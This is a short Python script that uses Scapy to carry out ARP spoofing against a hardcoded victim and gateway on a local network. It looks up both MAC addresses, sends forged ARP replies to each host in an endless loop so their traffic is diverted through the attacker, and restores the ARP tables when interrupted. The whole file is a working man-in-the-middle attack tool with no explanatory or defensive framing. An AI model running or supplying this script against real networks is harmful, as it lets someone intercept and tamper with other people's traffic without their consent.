#from kamene.all import *
from scapy.all import *
from time import sleep

def getMAC(ip):
    ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, retry=3)
    for s, r in ans:
        return r.sprintf('%Ether.src%')

def poisonARP(srcip, targetip, targetmac):
    arp = ARP(op=2, psrc=srcip, pdst=targetip, hwdst=targetmac)
    send(arp)

def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
    arp1 = ARP(op=2, pdst=victimip, psrc=gatewayip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gatewaymac)
    arp2 = ARP(op=2, pdst=gatewayip, psrc=victimip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=victimmac)
    send(arp1, count=3)
    send(arp2, count=3)

def main():
    gatewayip = '192.168.1.1'#input('gatewayip : ')
    victimip = '192.168.1.122'#input('victimip : ')

    victimmac = getMAC(victimip)
    gatewaymac = getMAC(gatewayip)

    if victimmac == None or gatewaymac == None:
        print('can\'t find MAC address')
        return

    print('APR spoofing start! victim IP -> %s' %victimip)
    print('%s : poison arp table, %s -> %s' %(victimip, gatewaymac, victimmac))
    try:
        while True:
            poisonARP(gatewayip, victimip, victimmac)
            poisonARP(victimip, gatewayip, gatewaymac)
            sleep(3)
    except KeyboardInterrupt:
        restoreARP(victimip, gatewayip, victimmac, gatewaymac)
        print('spoofing stop! restore arp table')

if __name__ == '__main__':
    main()